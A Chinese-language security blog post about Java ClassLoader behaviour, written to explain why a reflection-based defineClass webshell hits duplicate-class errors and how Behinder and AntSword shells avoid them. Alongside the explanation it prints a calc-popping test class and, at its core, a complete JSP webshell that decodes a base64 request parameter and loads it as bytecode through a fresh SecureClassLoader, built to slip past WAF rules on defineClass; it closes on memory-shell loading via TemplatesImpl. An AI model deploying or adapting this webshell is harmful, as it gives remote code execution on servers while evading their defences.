# ClassLoader的理解


<meta name="referrer" content="no-referrer" />

## 前言

补上上次星球无奖问答环节的坑。(本来北辰师傅在星球中没改马甲名字，后来才知道下面回答的是北辰师傅，emmmm尴尬尴尬)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177002213-9fb0c8ce-51fe-40b1-94e9-dc925eb8dbb1.png)

起因是小伙伴在hvv的过程中发现WAF会拦截Webshell中defineClass这个函数，因为反射可以把我们需要调用的方法放到一个字符串的位置，就可以产生各种变形，所以就想通过反射来绕过。

于是乎就劈里啪啦写了这样一段代码：

```
Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);

defineClass.setAccessible(true);
defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length)
```

然后发现第一次连接可以，第二次再刷新就会一直提示类重复加载的错误。

其实这个问题主要涉及到对JAVA中类加载机制的理解，于是就引申出来另一个问题：为什么冰蝎跟蚁剑原来的shell就不会提示类重复加载的错误呢。在这篇文章里跟大家分享一下自己的理解。

## ClassLoader的特性

关于类加载机制已经有很多文章，在这个问题上主要涉及到其中一个知识点：

一个类，如果由不同的类加载器实例加载的话，会在方法区产生两个不同的类，彼此不可见，并且在堆中生成不同Class实例。



这里我们做一个小实验，首先写一个测试的目标类，就是简单的弹一个计算器。

```
package com;

import java.io.IOException;

public class calc {
    public calc() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```

编译然后获取class文件的base64结果，放入到下面代码中。



需要注意的是，完成之后需要在idea中把上面弹计算器的类给删掉，这样才能模拟加载一个不存在类的效果。

```
package loader;

import java.util.Base64;

public class test1 {
    public static class DefineLoader extends ClassLoader {
        public Class load(byte[] bytes) {
            return super.defineClass(null, bytes, 0, bytes.length);
        }
    }

    public static void main(String[] args) {
        String cls = "yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW";
        byte[] bytes = Base64.getDecoder().decode(cls);

        DefineLoader defineLoader1 = new DefineLoader();
        try {
            defineLoader1.load(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        DefineLoader defineLoader2 =new DefineLoader();
        try {
            Class.forName("com.calc",true,defineLoader1);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

运行之后发现弹出了计算器，因为此时我们加载这个类的ClassLoader就是defineLoader1。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177825820-cc967fb6-3814-4a1a-86dc-7827f859f731.png)

接着修改Class.forname的类加载器为另一个defineLoader2再运行

```
        try {
            Class.forName("com.calc",true,defineLoader2);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
```

这个时候因为使用的另一个不同的类加载器进行加载，所以就提示找不到这个类了

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619177894463-e6256695-3dbd-4968-a516-a091eeecc66e.png)



再做一个实验，打印两个Class的hashCode，发现两者确实是不同的。



```
package loader;

import java.util.Base64;

public class test1 {
    public static class DefineLoader extends ClassLoader {
        public Class load(byte[] bytes) {
            return super.defineClass(null, bytes, 0, bytes.length);
        }
    }

    public static void main(String[] args) {
        String cls = "yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMY29tL2NhbGM7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAHAEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAkACgcAIAwAIQAiAQAEY2FsYwwAIwAkAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJQAKAQAIY29tL2NhbGMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAUADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAIAAkACwAMAAkADQAKABEADAANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW";
        byte[] bytes = Base64.getDecoder().decode(cls);

        DefineLoader defineLoader1 = new DefineLoader();
        DefineLoader defineLoader2 =new DefineLoader();
        try {
            Class cls1 = defineLoader1.load(bytes);
            System.out.println(cls1.hashCode());
            Class cls2 = defineLoader2.load(bytes);
            System.out.println(cls2.hashCode());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619178821551-0461c0d5-2239-4125-a43c-2705bd1926a0.png)

在JAVA世界里，决定一个类的唯一性主要有两点：

- 类名
- 他的类加载器。

> 比较两个类是否“相等”，只有在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使这两个类来源于同一个Class文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。

所以在每次打过去的类名都是相同的情况下，我们只要保证这两个类是由不同的加载器去加载的就可以解决类重复加载的问题了。

所以冰蝎、蚁剑的jsp shell在每次调用之前都会去new一个新的类加载器来加载对应的字节码，这样就可以保证不会出现类重复加载的问题。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179211419-cf589aef-928d-423a-8c7a-9951603ae9c6.png)

那么应该怎么用反射写呢？

原来的shell中是写了一个子类继承ClassLoader，我们完全可以从jdk中找一个同样继承ClassLoader并且没有改写defineClass的子类

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179502098-1d196196-05d2-490b-b77f-5eebf0f6f9a6.png)

在这里我们选择java.security.SecureClassLoader这个类，每次去new一个这个类，然后defineClass.invoke的时候把new出来的ClassLoader实例给传进去。

构造出来的shell如下：

```
<%!
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");

    if (cls != null) {
        try {
            byte[] payload = base64Decode(cls);
            ClassLoader loader = this.getClass().getClassLoader();
            java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineMethod.setAccessible(true);
            java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            java.lang.ClassLoader cl = (java.lang.ClassLoader) constructor.newInstance(new Object[]{loader});
            java.lang.Class c = (java.lang.Class) defineMethod.invoke(cl, payload, 0, payload.length);
            c.newInstance().equals(request);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%>
```

可以正常使用

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1599908/1619179685080-3310ef1c-7fb5-4a47-a85e-27cf66c0f6bc.png)



## 最后

研究过内存马的同学可以发现，很多内存马都继承了ClassLoader这个类，原因就是如果新建一个子类的话，内部类会单独产生一个class文件，导致没办法一次性打过去。所以就干脆把外部类变成ClassLoader的子类，直接调用本类的defineClass方法来加载恶意字节码。

但是在一些特殊情况下，比如说用TemplatesImpl打进去的时候，我们需要让恶意类来继承AbstractTranslet这个父类才可以，但是JAVA的设定是不能继承多个类。所以很多文章都是用TemplatesImpl的恶意类再去defineClass加载真正的内存马，这样就有点麻烦了。如果用本文中的写法，就不需要再继承ClassLoader了。
